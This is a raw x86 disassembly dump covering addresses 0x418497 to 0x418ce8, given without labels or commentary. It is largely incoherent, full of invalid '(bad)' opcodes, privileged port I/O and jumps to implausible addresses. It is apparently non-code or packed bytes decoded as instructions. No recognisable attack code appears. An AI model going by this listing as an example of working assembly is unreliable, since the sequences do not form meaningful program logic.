  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
